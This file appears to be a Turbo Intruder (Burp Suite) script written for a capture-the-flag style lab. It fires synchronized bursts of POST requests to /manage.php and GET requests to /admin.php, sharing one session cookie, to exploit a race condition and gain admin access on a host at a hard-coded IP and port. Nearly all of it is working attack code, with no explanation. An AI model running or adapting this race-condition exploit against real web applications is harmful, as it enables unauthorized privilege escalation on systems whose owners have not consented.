def queueRequests(target, wordlists):

    # if the target supports HTTP/2, specify engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint='http://94.237.61.84:37338',
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           engine=Engine.BURP
                           )

    req1 = r'''POST /manage.php HTTP/1.1
Host: 94.237.61.84:37338
Content-Length: 38
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://94.237.61.84:37338
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.61.84:37338/manage.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=oohhlid19ahgfk3v1qd647f15t
Connection: close

username=&password=test&delete=&register=%s

'''

    req2 = r'''GET /admin.php HTTP/1.1
Host: 94.237.61.84:37338
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36%s
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.61.84:37338/manage.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=oohhlid19ahgfk3v1qd647f15t
Connection: close

'''

    for i in range(20):
        engine.queue(req1, i, gate='race1')
        engine.queue(req2, i, gate='race1')

    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
